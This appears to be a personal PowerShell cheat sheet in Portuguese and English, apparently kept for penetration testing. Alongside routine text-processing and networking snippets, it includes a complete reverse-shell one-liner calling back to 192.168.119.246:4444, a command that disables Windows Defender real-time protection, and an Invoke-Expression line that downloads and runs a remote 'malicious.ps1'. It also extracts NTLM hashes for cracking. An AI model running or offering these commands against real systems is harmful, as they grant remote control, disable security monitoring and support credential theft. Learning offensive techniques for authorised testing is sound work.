Powershell
========================

Executar o seguinte comando para habilitar a utilização de scripts em powershell:


    Set-ExecutionPolicy RemoteSigned

https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/

opção "A"

Full Path powershelll

64 bits version: C:\Windows\System32\WindowsPowerShell\v1.0\
32 bits version: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\

    %SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe
    #ou
    C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe   

## Architecture

    (Get-Process -Id $PID).StartInfo.EnvironmentVariables["PROCESSOR_ARCHITECTURE"];
    
    [Environment]::Is64BitProcess


## Versão do powerhsell

    $host.version.major

## Desabilitar windows defender com powershell

Set-MpPreference -DisableRealtimeMonitoring $true


## Comments
    #comments in powershell 
  
One-liner shell in powershell:

    #no lado do servidor basta abrir um netcat -nlvp 4444
    $client = New-Object System.Net.Sockets.TCPClient('192.168.119.246',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()


## read file line by line

    foreach($line in Get-Content .\file.txt) {
        if($line -match $regex){
            # Work here
        }
    }
   
  
  
## infinete loop 

    while($True) {
    ...
    }

## Scripts examples

### change the directory of all files of a specific extension 

    get-childitem *.exe -recurse d: | foreach-object { move-item $_.path -destination C:\destination}

## Networking

get-netadapter

get-netipinterface
get-netipinterface

Change interface priority
set-netipinterface  -interfaceindex "xx" -interfacemetric "xx"

get dns and ip info

Get-DnsClientServerAddress

Adding routes in routing table of windows with powershell

new-NetRoute -DestinationPrefix "192.168.1.0/24" -interfaceindex 29 -nexthop 10.8.0.1

### Scan de portas com powershell

    Test-NetConnection -port 8443 192.168.0.13

## smb configuration

    Get-SmbClientConfiguration


## grep in powershell
source: https://stackoverflow.com/questions/53867147/grep-and-sed-equivalent-in-powershell

	select-string -path "C:/path/to/file" -Pattern "regex"

Getting item codes from marjorie

    select-string -Path * -Pattern "\[[a-zA-Z ]*[A-Z]{1,3}\d{3}]" -Allmatches | % { $_.Matches } | % { $_.Value } 

    % {$_.Matches} - > property returned from select-string -allmatches


Results from the following command:

    select-string -Path * -Pattern "\[[a-zA-Z ]*[A-Z]{1,3}\d{3}]" -Allmatches | % { $_.Matches }


Groups   : {0}
Success  : True
Name     : 0
Captures : {0}
Index    : 53
Length   : 11
Value    : [Anel Q301]

Groups   : {0}
Success  : True
Name     : 0
Captures : {0}
Index    : 38
Length   : 13
Value    : [Brinco Q427]

**OBS: understantind the memberns properties returned from select-string piping get-member**
    
    select-string -Path * -Pattern "\[[a-zA-Z ]*[A-Z]{1,3}\d{3}]" -Allmatches | get-member

Example:

    cat .\nomes.txt | foreach-object { %{$_.split(":")[1]}} | foreach-object { %{$_.replace(" ","")}}

![qownnotes-media-WcsQpc](file://media/12807.png)

    grep -o 
    select-string -Path * -Pattern "\[[a-zA-Z ]*[A-Z]{1,3}\d{3}]" -Allmatches | foreach-object { $_.Matches.Value }

## cut in powershell
source: https://stackoverflow.com/questions/24634022/what-is-an-equivalent-of-nix-cut-command-in-powershell
	
	Get-Content $filename | ForEach-Object { $_.split(":")[1] }


cut example for UHG's passwords cracking 

    select-string -pattern "ntlm" .\doc.txt | % { $_.line.split(" ")[4]} > hashes.txt

## sed in powershell
source https://blogs.msdn.microsoft.com/zainnab/2007/07/08/grep-and-sed-with-powershell/

	cat somefile.txt | %{$_ -replace "expression","replace"}

example in oliverlux

	select-string -Path *.txt -Pattern "[A-Z]{1,3}\d{3}" -Allmatches | foreach-object { write-host $_.Matches.Value ($_.filename -replace "txt","jpg") }

Example on using regex to remove spaces in the init of the line:

    cat .\nomes.txt | foreach-object { %{$_.split(":")[1]}} | foreach-object { %{$_ -replace("^ ","")}}

## locate in powershell

    get-childitem -recurse . file_name.txt

or in cmd

    dir /s

where "." is the path to start searching

## sort

sort-object

## sort -u

get-unique

Example:

cat wordlist.txt | get-unique | sort-object > wordlist_sorted.txt

## for in powershell

	for ($i=0; i -lt $hashes.length; i+=2) {
	... do something
	}
Pratical example:

	for ($i=0; $i -lt $hashes.length; $i+=2) { 
		SELECT-STRING -pattern $hashes[$i].replace('$NT$','') -context 5,0 doc.txt
		write-host $hashes[$i+1]
	}

# webclient
like wget
this get the html from www.google.com

    $webclient = (new-object net.webclient).DownloadString("http://www.google.com")

associated with iex Invoke-expression it is possible to download a malicious file:

	invoke-expression (new-object net.webclient).DownloadString("http://www.192.168.1.253/┼malicious.ps1")
	
# AV in powershell

get-mpthreatdetection 

output :

ThreatID                       : 2147706304
ThreatStatusErrorCode          : 0
ThreatStatusID                 : 1
PSComputerName                 :

ActionSuccess                  : True
AdditionalActionsBitMask       : 0
AMProductVersion               : 4.18.1907.4
CleaningActionID               : 3
CurrentThreatExecutionStatusID : 1
DetectionID                    : {D6621614-8D82-457F-9DA9-68337198FB8D}
DetectionSourceTypeID          : 3
DomainUser                     : DESKTOP-U30IRRA\olive
InitialDetectionTime           : 01/09/2019 17:14:23
LastThreatStatusChangeTime     : 01/09/2019 17:14:29
ProcessName                    : C:\Program Files (x86)\ownCloud\owncloud.exe
RemediationTime                : 01/09/2019 17:14:29
Resources                      : {file:_C:\Users\olive\Desktop\acosta\owncloud\Tools_Utilities\tools\projects\VulnPorta
                                 l\.Invoke-Mimikatz.ps1.~7ec}
ThreatID                       : 2147706304
ThreatStatusErrorCode          : 0
ThreatStatusID                 : 4
PSComputerName                 :

To get exactly the number of threats found:
Get-MpThreatDetection | where {$_.InitialDetectionTime -gt "01/09/2019 18:43:10"} | measure | % {$_.count}

# line arguments in powershell

$arq_nessus=$args[0]

# output redirection
source:
https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_redirection?view=powershell-6
Example:

&{for ($i=0; $i -lt $hashes.length; $i+=2) { SELECT-STRING -pattern ($hashes[$i].replace('$NT$','')).split(":")[0] -context 5,0 doc.txt; echo ($hashes[$i+1].split(":"))[1]}} > results.txt

## nmap with powershell

test-netconnection -port 22 192.168.1.254